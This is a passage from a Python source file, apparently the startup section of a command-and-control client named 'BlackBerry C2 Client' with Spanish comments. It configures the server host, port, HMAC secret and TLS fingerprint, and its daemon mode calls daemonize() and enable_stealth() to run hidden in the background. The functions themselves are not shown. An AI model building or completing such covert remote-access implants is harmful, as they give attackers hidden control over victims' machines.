    parser.add_argument('--daemon', action='store_true', 
                        help='Ejecutar como daemon en segundo plano')
    
    args = parser.parse_args()
    
    SERVER_HOST = args.host
    SERVER_PORT = args.port
    
    # Configurar HMAC secret (servidor genera token hex)
    if args.hmac != 'false':
        s = args.hmac.strip()
        try:
            HMAC_PRE_SHARED_SECRET = bytes.fromhex(s)
        except ValueError:
            HMAC_PRE_SHARED_SECRET = s.encode('utf-8')
    
    # Configurar fingerprint
    if args.fingerprint != 'false':
        VERIFY_FINGERPRINT = True
        EXPECTED_FINGERPRINT = args.fingerprint
    
    # Configurar modo daemon
    DAEMON_MODE = args.daemon
    
    if DAEMON_MODE:
        if os.name == 'posix':
            daemonize()
        enable_stealth()
    else:
        print("=" * 60)
        print("BlackBerry C2 Client - TLS")
        print("=" * 60)
        print(f"Host: {SERVER_HOST}")
        print(f"Port: {SERVER_PORT}")
        print(f"HMAC: {'Configurado' if args.hmac != 'false' else 'Default'}")
        print(f"Fingerprint ECDHE: {'Verificación habilitada' if VERIFY_FINGERPRINT else 'No verificar'}")
        print(f"Modo: Interactivo (--daemon para segundo plano)")
        print("=" * 60)
        print()
    
    run_client()
